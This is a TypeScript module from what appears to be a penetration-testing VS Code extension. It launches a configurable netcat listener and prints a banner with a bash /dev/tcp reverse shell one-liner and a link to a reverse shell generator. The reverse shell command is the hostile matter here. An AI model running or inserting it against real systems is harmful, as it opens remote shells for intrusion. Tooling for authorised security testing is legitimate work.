import * as vscode from 'vscode';
import { logger } from '../../../platform/vscode/logger';
import { BaseWeaponizedTerminalProvider } from './base';
import { variables } from '../../../platform/vscode/variables';

export const NetcatWeaponizedTerminalProvider = new BaseWeaponizedTerminalProvider(
  "netcat handler",
  () => {
    let netcatCommand = vscode.workspace.getConfiguration("weaponized").get<string>("netcat");
    if (!netcatCommand) {
      vscode.window.showErrorMessage("Please set the 'weaponized.netcat' configuration in settings.");
      return [];
    }
    let lprot = variables(vscode.workspace.getConfiguration("weaponized").get<string>("lport", "$LPORT"));
    netcatCommand = variables(netcatCommand).replace("$LPORT", lprot); // Resolve variables in the command
    let args: string[] = [
      netcatCommand
    ];
    logger.debug(`Starting Netcat session with args: ${JSON.stringify(args)}`);
    return [
      netcatCommand,
    ];
  },
  () => {
    let lhost = variables(vscode.workspace.getConfiguration("weaponized").get<string>("lhost", "$LHOST"));
    let lport = variables(vscode.workspace.getConfiguration("weaponized").get<string>("lport", "$LPORT"));
    let msg = `\r\nIP ADDRESS: ${lhost}\tPORT: ${lport}\r\nBasic Reverse Shell Command:\r\n\t/bin/bash -i >& /dev/tcp/${lhost}/${lport} 0>&1\r\nAdvanced Reverse Shell Command:\r\n\thttps://rev.eson.ninja/?ip=${lhost}&port=${lport}\r\n`;
    return msg;
  }
);
